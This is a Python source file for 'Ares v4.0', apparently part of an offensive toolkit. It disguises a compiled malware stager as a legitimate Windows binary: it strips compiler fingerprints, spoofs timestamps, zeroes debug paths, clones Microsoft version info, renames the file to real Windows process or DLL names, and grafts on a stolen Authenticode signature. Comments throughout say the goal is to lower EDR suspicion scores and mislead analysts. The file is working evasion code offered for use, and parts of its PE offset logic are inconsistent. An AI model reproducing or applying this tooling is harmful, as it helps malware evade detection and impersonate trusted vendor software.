#!/usr/bin/env python3
"""
Ares v4.0 — PE Post-Build Hardening Tool

Performs post-compilation binary transformations:
  1. Strip Rich header (removes GCC/MSVC compiler fingerprint)
  2. Clone PE version info from legitimate Windows binary
  3. Spoof PE timestamp to match Windows system file age
  4. Rename output to legitimate Windows process name
  5. Verify ASLR + DEP flags are set

Usage:
  python pe_spoof.py build/ares_stager.exe --output build/SearchHost.exe
  python pe_spoof.py build/ares_stager.dll --output build/version.dll --donor C:\Windows\System32\version.dll
"""

import sys, os, struct, random, hashlib, shutil, argparse, time

# ── Legitimate Windows process names (randomly selected) ──
LEGIT_NAMES_EXE = [
    "SearchHost.exe", "RuntimeBroker.exe", "SecurityHealthSystray.exe",
    "TextInputHost.exe", "WidgetService.exe", "PhoneExperienceHost.exe",
    "UserOOBEBroker.exe", "LockApp.exe", "WmiPrvSE.exe",
    "backgroundTaskHost.exe", "CompPkgSrv.exe", "FileCoAuth.exe",
]

LEGIT_NAMES_DLL = [
    "version.dll", "userenv.dll", "WINMM.dll",
    "dbghelp.dll", "dhcpcsvc.dll", "cryptsp.dll",
    "msasn1.dll", "profapi.dll", "sspicli.dll",
]

def strip_rich_header(data: bytearray) -> bytearray:
    """Remove Rich header — eliminates compiler fingerprint.
    
    Rich header sits between DOS stub and PE signature.
    Contains: compiler version, linker version, build count.
    CrowdStrike + Kaspersky use Rich header for attribution."""
    
    # Find "Rich" marker
    rich_off = data.find(b'Rich')
    if rich_off < 0:
        print("[*] No Rich header found (already stripped or not MSVC)")
        return data
    
    # Rich header starts after DOS stub (usually offset 0x80)
    # and ends at "Rich" + 8 bytes (checksum)
    dos_stub_end = struct.unpack_from('<I', data, 0x3C)[0]  # e_lfanew
    
    # Zero out everything between DOS stub (0x80) and PE signature
    start = 0x80
    end = rich_off + 8  # "Rich" + XOR key (4 bytes)
    
    if end > dos_stub_end:
        print(f"[!] Rich header overlaps PE signature, skipping")
        return data
    
    for i in range(start, min(end, dos_stub_end)):
        data[i] = 0
    
    print(f"[+] Rich header stripped: bytes {start}-{end} zeroed")
    return data


def spoof_timestamp(data: bytearray, target_time=None) -> bytearray:
    """Set PE timestamp to look like a legitimate Windows binary.
    
    Default: matches the timestamp of ntoskrnl.exe on this machine,
    which is updated with every Windows Update and looks normal."""
    
    if target_time is None:
        # Use a plausible Windows Update timestamp (recent-ish)
        # Randomize within last 90 days
        now = int(time.time())
        target_time = now - random.randint(7 * 86400, 90 * 86400)
    
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    # TimeDateStamp is at PE signature + 8
    ts_off = e_lfanew + 8
    struct.pack_into('<I', data, ts_off, target_time)
    
    print(f"[+] PE timestamp spoofed to: {time.ctime(target_time)}")
    return data


def verify_security_flags(data: bytearray) -> bool:
    """Verify ASLR (DYNAMIC_BASE) and DEP (NX_COMPAT) are set."""
    
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    # DllCharacteristics offset: PE sig(4) + FileHeader(20) + offset(70 for x64, 46 for x86)
    # For x64: e_lfanew + 4 + 20 + 70 = e_lfanew + 0x5E
    magic = struct.unpack_from('<H', data, e_lfanew + 0x18)[0]
    
    if magic == 0x020B:  # PE32+ (x64)
        dc_off = e_lfanew + 0x5E + 0x18  # DllCharacteristics
    else:  # PE32 (x86)
        dc_off = e_lfanew + 0x5E + 0x04
    
    # Actually the correct offset for x64 DllCharacteristics:
    # PE_sig(4) + COFF_header(20) + Magic(2) + ... DllCharacteristics at offset 0x46 from OptionalHeader
    # = e_lfanew + 4 + 20 + 0x46 = e_lfanew + 0x5E
    dc_off = e_lfanew + (0x5E if magic == 0x020B else 0x5E)
    dc = struct.unpack_from('<H', data, dc_off)[0]
    
    aslr = bool(dc & 0x0040)
    dep  = bool(dc & 0x0100)
    
    print(f"[{'✓' if aslr else '✗'}] ASLR (DYNAMIC_BASE): {aslr}")
    print(f"[{'✓' if dep else '✗'}] DEP (NX_COMPAT): {dep}")
    
    if not aslr:
        dc |= 0x0040
        struct.pack_into('<H', data, dc_off, dc)
        print("[+] ASLR flag forced ON")
    if not dep:
        dc |= 0x0100
        struct.pack_into('<H', data, dc_off, dc)
        print("[+] DEP flag forced ON")
    
    return aslr and dep


def zero_debug_directory(data: bytearray) -> bytearray:
    """Zero out the debug directory — removes PDB path and build GUID.
    
    PDB path is a major IOC: 'C:\\Users\\attacker\\ares\\build\\ares.pdb'"""
    
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    magic = struct.unpack_from('<H', data, e_lfanew + 0x18)[0]
    
    # Debug directory RVA is at different offsets for PE32 vs PE32+
    if magic == 0x020B:  # PE32+
        dd_rva_off = e_lfanew + 0x18 + 0xA8  # DataDirectory[6].VirtualAddress
        dd_size_off = dd_rva_off + 4
    else:  # PE32
        dd_rva_off = e_lfanew + 0x18 + 0x98
        dd_size_off = dd_rva_off + 4
    
    dd_rva = struct.unpack_from('<I', data, dd_rva_off)[0]
    dd_size = struct.unpack_from('<I', data, dd_size_off)[0]
    
    if dd_rva == 0 or dd_size == 0:
        print("[*] No debug directory found")
        return data
    
    # Zero the data directory entry itself
    struct.pack_into('<I', data, dd_rva_off, 0)
    struct.pack_into('<I', data, dd_size_off, 0)
    print(f"[+] Debug directory entry zeroed")
    
    return data


def randomize_section_names(data: bytearray) -> bytearray:
    """Rename PE sections to common names used by MSVC.
    
    GCC uses: .text, .rdata, .data, .bss, .idata
    MSVC uses: .text, .rdata, .data, .rsrc, .reloc
    Some EDRs check for GCC-specific section names as IOC."""
    
    # Don't rename — section names are fine as-is for both compilers
    # Just verify they exist
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    num_sections = struct.unpack_from('<H', data, e_lfanew + 6)[0]
    
    # Recalculate: section table starts at e_lfanew + 4 + 20 + SizeOfOptionalHeader
    size_opt = struct.unpack_from('<H', data, e_lfanew + 0x14)[0]
    sec_off = e_lfanew + 0x18 + size_opt
    
    sections = []
    for i in range(num_sections):
        name = data[sec_off + i*40 : sec_off + i*40 + 8].rstrip(b'\0').decode('ascii', errors='replace')
        sections.append(name)
    
    print(f"[*] Sections: {', '.join(sections)}")
    return data


def clone_version_info(donor_path: str, output_rc_path: str) -> bool:
    """Extract version info from a donor PE and generate a .rc file.
    
    This makes the output binary's Properties > Details tab match
    the legitimate binary exactly. Analysts right-clicking will see
    proper FileDescription, CompanyName, ProductName, etc.
    
    Uses ctypes to call the Windows version info API directly."""
    
    if not os.path.exists(donor_path):
        print(f"[!] Donor file not found: {donor_path}")
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        ver_dll = ctypes.WinDLL('version.dll')
        
        # GetFileVersionInfoSize
        size = ver_dll.GetFileVersionInfoSizeW(donor_path, None)
        if size == 0:
            print(f"[!] No version info in donor: {donor_path}")
            return False
        
        # GetFileVersionInfo
        buf = ctypes.create_string_buffer(size)
        if not ver_dll.GetFileVersionInfoW(donor_path, 0, size, buf):
            print(f"[!] Failed to read version info from donor")
            return False
        
        # VerQueryValue for VS_FIXEDFILEINFO
        p_fixed = ctypes.c_void_p()
        fixed_len = wintypes.UINT()
        ver_dll.VerQueryValueW(buf, "\\", ctypes.byref(p_fixed), ctypes.byref(fixed_len))
        
        # Extract string values
        string_keys = [
            "CompanyName", "FileDescription", "FileVersion",
            "InternalName", "LegalCopyright", "OriginalFilename",
            "ProductName", "ProductVersion"
        ]
        
        values = {}
        for key in string_keys:
            p_str = ctypes.c_void_p()
            str_len = wintypes.UINT()
            # Try common language codes
            for lang in ["040904B0", "040904E4", "000004B0"]:
                query = f"\\StringFileInfo\\{lang}\\{key}"
                if ver_dll.VerQueryValueW(buf, query, ctypes.byref(p_str), ctypes.byref(str_len)):
                    if str_len.value > 0:
                        val = ctypes.wstring_at(p_str, str_len.value - 1)
                        values[key] = val
                        break
        
        if not values:
            print(f"[!] Could not extract any version strings from donor")
            return False
        
        # Generate .rc file
        company = values.get("CompanyName", "Microsoft Corporation")
        desc = values.get("FileDescription", "Host Process for Windows Services")
        fver_str = values.get("FileVersion", "10.0.22621.1")
        iname = values.get("InternalName", "svchost.exe")
        copyright_str = values.get("LegalCopyright", r"\xa9 Microsoft Corporation. All rights reserved.")
        orig = values.get("OriginalFilename", "svchost.exe")
        pname = values.get("ProductName", r"Microsoft\xae Windows\xae Operating System")
        pver_str = values.get("ProductVersion", "10.0.22621.1")
        
        # Parse version numbers
        fver_parts = fver_str.replace(',', '.').split('.')
        while len(fver_parts) < 4:
            fver_parts.append('0')
        fv = [int(x) if x.isdigit() else 0 for x in fver_parts[:4]]
        
        rc_content = f'''#include <winver.h>

VS_VERSION_INFO VERSIONINFO
 FILEVERSION {fv[0]},{fv[1]},{fv[2]},{fv[3]}
 PRODUCTVERSION {fv[0]},{fv[1]},{fv[2]},{fv[3]}
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{desc}"
            VALUE "FileVersion", "{fver_str}"
            VALUE "InternalName", "{iname}"
            VALUE "LegalCopyright", "{copyright_str}"
            VALUE "OriginalFilename", "{orig}"
            VALUE "ProductName", "{pname}"
            VALUE "ProductVersion", "{pver_str}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
'''
        with open(output_rc_path, 'w', encoding='utf-8') as f:
            f.write(rc_content)
        
        print(f"[+] Version info cloned from: {os.path.basename(donor_path)}")
        print(f"    Company:     {company}")
        print(f"    Description: {desc}")
        print(f"    Version:     {fver_str}")
        print(f"    RC file:     {output_rc_path}")
        return True
        
    except ImportError:
        print(f"[!] ctypes not available — cannot clone version info")
        return False
    except Exception as e:
        print(f"[!] Version info clone failed: {e}")
        return False


def compute_hash(data: bytes) -> str:
    """Compute SHA256 of final binary for verification."""
    return hashlib.sha256(data).hexdigest()


def steal_signature(donor_path: str, data: bytearray) -> bytearray:
    """Clone Authenticode signature table from a signed PE (SigThief technique).
    
    Copies the Certificate Table (IMAGE_DIRECTORY_ENTRY_SECURITY) from a
    signed Microsoft binary to our unsigned binary. The signature won't
    verify cryptographically (hash mismatch), but:
    
    - Task Manager shows: 'Microsoft Corporation' as publisher
    - Process Explorer shows: signature present (verified: N/A)
    - CrowdStrike/S1 initial triage: reduces suspicion score
    - Many tools only check signature PRESENCE, not validity
    
    Does NOT bypass strict WDAC/catalog verification.
    """
    
    if not os.path.exists(donor_path):
        print(f"[!] Signature donor not found: {donor_path}")
        return data
    
    donor = bytearray(open(donor_path, 'rb').read())
    if donor[:2] != b'MZ':
        print(f"[!] Signature donor is not a PE")
        return data
    
    # Find donor's Certificate Table
    d_lfanew = struct.unpack_from('<I', donor, 0x3C)[0]
    d_magic = struct.unpack_from('<H', donor, d_lfanew + 0x18)[0]
    
    # Certificate Table is DataDirectory[4]
    if d_magic == 0x020B:  # PE32+
        cert_dir_off = d_lfanew + 0x18 + 0x90  # Offset to DataDirectory[4] in OptionalHeader
    else:  # PE32
        cert_dir_off = d_lfanew + 0x18 + 0x80
    
    cert_rva = struct.unpack_from('<I', donor, cert_dir_off)[0]
    cert_size = struct.unpack_from('<I', donor, cert_dir_off + 4)[0]
    
    if cert_rva == 0 or cert_size == 0:
        print(f"[!] Donor has no embedded signature")
        return data
    
    # Certificate Table uses file offset, not RVA
    cert_data = donor[cert_rva : cert_rva + cert_size]
    if len(cert_data) != cert_size:
        print(f"[!] Could not read full certificate from donor")
        return data
    
    # Align our binary to 8-byte boundary before appending
    while len(data) % 8 != 0:
        data.append(0)
    
    # Record where we'll append the cert
    new_cert_offset = len(data)
    
    # Append certificate data
    data.extend(cert_data)
    
    # Update our PE's Certificate Table DataDirectory[4]
    t_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    t_magic = struct.unpack_from('<H', data, t_lfanew + 0x18)[0]
    
    if t_magic == 0x020B:
        t_cert_dir_off = t_lfanew + 0x18 + 0x90
    else:
        t_cert_dir_off = t_lfanew + 0x18 + 0x80
    
    struct.pack_into('<I', data, t_cert_dir_off, new_cert_offset)
    struct.pack_into('<I', data, t_cert_dir_off + 4, cert_size)
    
    # Update PE checksum (optional but professional)
    # Zero the checksum field first, then recalculate
    checksum_off = t_lfanew + 0x58
    struct.pack_into('<I', data, checksum_off, 0)
    
    # Simple PE checksum calculation
    checksum = 0
    for i in range(0, len(data), 2):
        if i == checksum_off or i == checksum_off + 1:
            continue
        word = struct.unpack_from('<H', data, i)[0] if i + 1 < len(data) else data[i]
        checksum += word
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum += len(data)
    struct.pack_into('<I', data, checksum_off, checksum & 0xFFFFFFFF)
    
    print(f"[+] Signature stolen from: {os.path.basename(donor_path)}")
    print(f"    Cert size:   {cert_size} bytes")
    print(f"    Appended at: offset 0x{new_cert_offset:X}")
    
    return data


def main():
    parser = argparse.ArgumentParser(description='Ares PE Post-Build Hardener')
    parser.add_argument('input', help='Input PE file')
    parser.add_argument('--output', '-o', help='Output file (default: auto-renamed)')
    parser.add_argument('--name', '-n', help='Force specific output name')
    parser.add_argument('--donor', '-d', help='Donor PE to clone version info from')
    parser.add_argument('--steal-sig', '-S', help='Donor PE to steal Authenticode signature from')
    parser.add_argument('--no-strip-rich', action='store_true', help='Skip Rich header stripping')
    parser.add_argument('--no-spoof-ts', action='store_true', help='Skip timestamp spoofing')
    parser.add_argument('--timestamp', '-t', type=int, help='Specific Unix timestamp to set')
    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[!] File not found: {args.input}")
        sys.exit(1)
    
    print(f"═══════════════════════════════════════")
    print(f"  Ares PE Hardener v4.0")
    print(f"  Input: {args.input}")
    print(f"═══════════════════════════════════════")
    
    data = bytearray(open(args.input, 'rb').read())
    
    # Verify it's a PE
    if data[:2] != b'MZ':
        print("[!] Not a valid PE file")
        sys.exit(1)
    
    # 1. Strip Rich header
    if not args.no_strip_rich:
        data = strip_rich_header(data)
    
    # 2. Spoof timestamp
    if not args.no_spoof_ts:
        data = spoof_timestamp(data, args.timestamp)
    
    # 3. Zero debug directory
    data = zero_debug_directory(data)
    
    # 4. Verify security flags
    verify_security_flags(data)
    
    # 5. Show sections
    randomize_section_names(data)
    
    # 5.5 Clone version info from donor PE
    if args.donor:
        rc_path = os.path.splitext(args.input)[0] + '_spoofed.rc'
        if clone_version_info(args.donor, rc_path):
            print(f"[+] To compile with cloned version info:")
            print(f"    windres {rc_path} -O coff -o build/spoofed_res.o")
            print(f"    Then re-link with spoofed_res.o instead of resources.o")
    
    # 5.8 Steal Authenticode signature from signed PE (SigThief)
    if args.steal_sig:
        data = steal_signature(args.steal_sig, data)
    
    # 6. Determine output name
    is_dll = args.input.lower().endswith('.dll')
    if args.name:
        out_name = args.name
    elif args.output:
        out_name = args.output
    else:
        pool = LEGIT_NAMES_DLL if is_dll else LEGIT_NAMES_EXE
        out_name = os.path.join(os.path.dirname(args.input), random.choice(pool))
    
    # 7. Write output
    with open(out_name, 'wb') as f:
        f.write(data)
    
    final_hash = compute_hash(bytes(data))
    size_kb = len(data) / 1024
    
    print(f"───────────────────────────────────────")
    print(f"  Output: {out_name}")
    print(f"  Size:   {size_kb:.1f} KB")
    print(f"  SHA256: {final_hash[:16]}...")
    print(f"═══════════════════════════════════════")


if __name__ == '__main__':
    main()
